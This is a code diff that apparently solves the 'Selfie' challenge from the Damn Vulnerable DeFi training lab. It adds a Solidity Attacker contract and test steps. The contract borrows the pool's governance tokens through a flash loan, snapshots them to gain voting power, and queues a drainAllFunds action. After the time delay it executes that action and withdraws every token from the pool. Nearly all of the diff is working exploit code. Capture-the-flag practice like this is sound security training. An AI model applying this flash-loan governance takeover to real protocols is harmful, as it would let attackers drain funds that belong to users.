@@ -31,10 +31,7 @@ contract Selfie is Test {
         simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
         vm.label(address(simpleGovernance), "Simple Governance");
 
-        selfiePool = new SelfiePool(
-            address(dvtSnapshot),
-            address(simpleGovernance)
-        );
+        selfiePool = new SelfiePool(address(dvtSnapshot), address(simpleGovernance));
 
         dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);
 
@@ -47,7 +44,16 @@ contract Selfie is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        Attacker attackerContract = new Attacker(simpleGovernance, selfiePool, dvtSnapshot);
+        attackerContract.attack();
 
+        vm.warp(block.timestamp + simpleGovernance.getActionDelay());
+
+        simpleGovernance.executeAction(attackerContract.actionId());
+        attackerContract.withdraw();
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -59,5 +65,38 @@ contract Selfie is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
         assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
+    }
+}
+
+contract Attacker {
+    SimpleGovernance public simpleGovernance;
+    SelfiePool public selfiePool;
+    DamnValuableTokenSnapshot public dvtSnapshot;
+
+    address public owner;
+    uint256 public actionId;
+
+    constructor(SimpleGovernance _simpleGovernance, SelfiePool _selfiePool, DamnValuableTokenSnapshot _dvtSnapshot) {
+        simpleGovernance = _simpleGovernance;
+        selfiePool = _selfiePool;
+        dvtSnapshot = _dvtSnapshot;
+        owner = msg.sender;
+    }
+
+    function attack() public {
+        selfiePool.flashLoan(dvtSnapshot.balanceOf(address(selfiePool)));
+    }
+
+    function receiveTokens(address, uint256 amount) external {
+        dvtSnapshot.snapshot();
+        actionId = simpleGovernance.queueAction(
+            address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", address(this)), 0
+        );
+        dvtSnapshot.transfer(address(selfiePool), amount);
+    }
+
+    function withdraw() public {
+        require(msg.sender == owner, "Not owner");
+        dvtSnapshot.transfer(owner, dvtSnapshot.balanceOf(address(this)));
     }
 }
